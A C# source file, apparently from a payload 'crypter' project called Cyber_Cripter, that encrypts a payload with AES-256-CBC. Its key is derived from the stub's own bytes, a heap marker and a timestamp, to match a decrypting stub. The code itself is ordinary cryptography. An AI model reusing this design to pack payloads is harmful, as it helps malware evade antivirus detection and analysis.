using System;
using System.IO;
using System.Security.Cryptography;

namespace Cyber_Cripter
{
    /// <summary>
    /// IMPORTANTE: La implementación de la encriptación debe coincidir con la implementación de la desencriptación por parte del Stub para su funcionamiento.
    /// </summary>
    internal static class Encryption
    {
        /// <summary>
        /// Cifra un bloque de datos utilizando el algoritmo AES-256 en modo CBC
        /// con relleno PKCS#7.
        /// 
        /// La configuración empleada coincide con la utilizada por el stub
        /// mediante BCrypt (BCRYPT_AES_ALGORITHM, BCRYPT_CHAIN_MODE_CBC y
        /// BCRYPT_BLOCK_PADDING), garantizando que ambos componentes sean
        /// compatibles.
        /// </summary>
        public static byte[] EncryptAes256Cbc(byte[] plaintext, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                aes.Key = key;
                aes.IV = iv;

                using (var enc = aes.CreateEncryptor())
                using (var ms = new MemoryStream())
                using (var cs = new CryptoStream(ms, enc, CryptoStreamMode.Write))
                {
                    cs.Write(plaintext, 0, plaintext.Length);
                    cs.FlushFinalBlock();
                    return ms.ToArray();
                }
            }
        }


        /// <summary>
        /// Calcula el hash SHA-256 de un bloque de datos.
        /// Se utiliza para construir la Key.
        /// </summary>
        public static byte[] Sha256(byte[] data)
        {
            using (var sha = SHA256.Create())
            {
                return sha.ComputeHash(data);
            }
        }

        /// <summary>
        /// Deriva la clave AES empleada para cifrar el payload.
        /// La clave se obtiene aplicando SHA-256 sobre la concatenación de:
        ///     SHA256( heap_marker(8) || stubBytes[0..hashRegion] || timestamp(8 LE) )
        /// </summary>
        public static byte[] DeriveKey(byte[] heapMarker, byte[] stubBytes, int hashRegion, ulong timestamp)
        {
            byte[] buf = new byte[8 + hashRegion + 8];
            System.Buffer.BlockCopy(heapMarker, 0, buf, 0, 8);
            System.Buffer.BlockCopy(stubBytes,  0, buf, 8, hashRegion);
            // little-endian uint64 timestamp (coincide con MSVC x64 layout de g_meta.timestamp)
            // Version anterior: Buffer.BlockCopy(BitConverter.GetBytes(timestamp), 0, buf, 8 + hashRegion, 8);
            System.Buffer.BlockCopy(BitConverter.GetBytes(timestamp), 0, buf, 8 + hashRegion, 8);
            return Sha256(buf);
        }
    }
}
